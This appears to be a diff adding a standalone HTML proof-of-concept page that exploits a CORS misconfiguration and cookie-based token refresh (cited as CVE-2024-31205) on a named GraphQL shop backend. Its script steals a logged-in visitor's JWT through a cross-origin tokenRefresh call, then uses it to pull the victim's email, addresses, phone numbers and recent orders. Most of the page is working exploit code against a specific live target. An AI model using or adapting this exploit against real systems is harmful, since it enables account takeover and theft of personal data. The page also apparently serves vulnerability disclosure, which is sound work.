@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS + CSRF PoC — backend.n1.is</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 24px; }
+    h1 { color: #f0883e; margin-bottom: 8px; font-size: 18px; }
+    h2 { color: #58a6ff; margin: 16px 0 8px; font-size: 15px; }
+    .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 13px; }
+    button { background: #238636; color: #fff; border: none; padding: 10px 20px; font-family: monospace; font-size: 14px; cursor: pointer; border-radius: 4px; }
+    button:hover { background: #2ea043; }
+    button:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
+    .log { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin-top: 12px; max-height: 600px; overflow-y: auto; font-size: 13px; line-height: 1.6; }
+    .ok { color: #3fb950; }
+    .fail { color: #f85149; }
+    .warn { color: #d29922; }
+    .info { color: #58a6ff; }
+    .data { color: #f0883e; }
+    .dim { color: #484f58; }
+    pre { white-space: pre-wrap; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <h1>CORS Misconfiguration + CSRF Token Theft PoC</h1>
+  <p class="subtitle">
+    Target: backend.n1.is/graphql/ &mdash; CVE-2024-31205 combined with permissive CORS<br>
+    This page demonstrates that a malicious site can steal a logged-in user's JWT token and exfiltrate account data.
+  </p>
+  <button id="btn" onclick="runExploit()">Run PoC</button>
+  <div class="log" id="log"></div>
+
+  <script>
+    const GRAPHQL = "https://backend.n1.is/graphql/";
+    const logEl = document.getElementById("log");
+    const btn = document.getElementById("btn");
+
+    function log(msg, cls) {
+      const line = document.createElement("div");
+      line.className = cls || "";
+      line.innerHTML = msg;
+      logEl.appendChild(line);
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    async function gql(query, token) {
+      const headers = {
+        "Content-Type": "application/json",
+      };
+      if (token) headers["Authorization"] = "Bearer " + token;
+      const res = await fetch(GRAPHQL, {
+        method: "POST",
+        credentials: "include",
+        headers,
+        body: JSON.stringify({ query }),
+      });
+      return { status: res.status, data: await res.json(), headers: res.headers };
+    }
+
+    async function runExploit() {
+      btn.disabled = true;
+      logEl.innerHTML = "";
+
+      // Step 1: Verify CORS
+      log("[Step 1] Verifying CORS misconfiguration...", "info");
+      try {
+        const corsCheck = await gql("{ shop { name } }");
+        log("&check; CORS allows cross-origin request from " + location.origin, "ok");
+        log("<span class='dim'>  shop.name = " + (corsCheck.data?.data?.shop?.name || "N/A") + "</span>");
+      } catch (e) {
+        log("&cross; CORS blocked the request: " + e.message, "fail");
+        log("The browser refused the cross-origin request. CORS may have been fixed.", "warn");
+        btn.disabled = false;
+        return;
+      }
+
+      // Step 2: Attempt token refresh via cookie (CSRF)
+      log("", "");
+      log("[Step 2] Attempting tokenRefresh via cookie (CVE-2024-31205)...", "info");
+      log("<span class='dim'>  Calling tokenRefresh mutation with credentials:include (browser sends cookies)</span>");
+      try {
+        const refreshRes = await gql("mutation { tokenRefresh { token errors { field message code } } }");
+        const tokenData = refreshRes.data?.data?.tokenRefresh;
+        const errors = tokenData?.errors || [];
+
+        if (tokenData?.token) {
+          log("&check; TOKEN STOLEN: " + tokenData.token.substring(0, 40) + "...", "ok");
+
+          // Step 3: Use stolen token to exfiltrate user data
+          log("", "");
+          log("[Step 3] Using stolen JWT to exfiltrate account data...", "info");
+
+          const meRes = await gql("{ me { id email firstName lastName isStaff isActive dateJoined defaultShippingAddress { streetAddress1 streetAddress2 city postalCode country { code } phone } defaultBillingAddress { streetAddress1 streetAddress2 city postalCode country { code } phone } orders(first: 3) { edges { node { number status total { gross { amount currency } } } } } } }", tokenData.token);
+
+          const me = meRes.data?.data?.me;
+          if (me) {
+            log("&check; Account data exfiltrated successfully:", "ok");
+            log("", "");
+            log("<pre class='data'>" + JSON.stringify(me, null, 2) + "</pre>");
+
+            log("", "");
+            log("[Result] VULNERABILITY CONFIRMED", "ok");
+            log("A malicious website was able to:", "ok");
+            log("  1. Bypass CSRF protection via cookie-based tokenRefresh", "ok");
+            log("  2. Read the response due to permissive CORS (origin reflection + credentials)", "ok");
+            log("  3. Steal a valid JWT access token", "ok");
+            log("  4. Use the token to read the victim's personal data, addresses, and orders", "ok");
+          } else {
+            log("Token obtained but 'me' query returned null. Errors:", "warn");
+            log("<pre class='dim'>" + JSON.stringify(meRes.data, null, 2) + "</pre>");
+          }
+
+        } else if (errors.length > 0) {
+          const code = errors[0].code;
+          const msg = errors[0].message;
+
+          if (code === "JWT_MISSING_TOKEN") {
+            log("&cross; No refresh token cookie was sent by the browser.", "fail");
+            log("", "");
+            log("[Diagnosis]", "warn");
+            log("The browser did not include the refreshToken cookie in the cross-origin request.", "warn");
+            log("Possible reasons:", "warn");
+            log("  a) You are not logged in on vefverslun.n1.is — log in first, then re-run", "warn");
+            log("  b) The cookie has SameSite=Lax or SameSite=Strict — check cookie attributes", "warn");
+            log("  c) The cookie domain doesn't match backend.n1.is", "warn");
+            log("", "");
+            log("To check: open DevTools on vefverslun.n1.is > Application > Cookies and look for", "info");
+            log("a cookie named 'refreshToken' and note its SameSite and Domain attributes.", "info");
+          } else if (code === "JWT_DECODE_ERROR") {
+            log("&check; Cookie WAS sent (server tried to decode it) but token is invalid/expired.", "warn");
+            log("  Error: " + msg, "dim");
+            log("Try logging in again on vefverslun.n1.is to get a fresh refresh token, then re-run.", "info");
+          } else {
+            log("Unexpected error: " + code + " — " + msg, "warn");
+            log("<pre class='dim'>" + JSON.stringify(refreshRes.data, null, 2) + "</pre>");
+          }
+        }
+      } catch (e) {
+        log("&cross; Request failed: " + e.message, "fail");
+      }
+
+      // Step 4: Summary of CORS evidence
+      log("", "");
+      log("[CORS Evidence]", "info");
+      log("This page is hosted on: <span class='data'>" + location.origin + "</span>", "info");
+      log("Target API: <span class='data'>" + GRAPHQL + "</span>", "info");
+      log("The browser allowed reading the cross-origin response with credentials.", "info");
+      log("This proves Access-Control-Allow-Origin reflects our origin with Allow-Credentials: true.", "info");
+
+      btn.disabled = false;
+    }
+  </script>
+</body>
+</html>
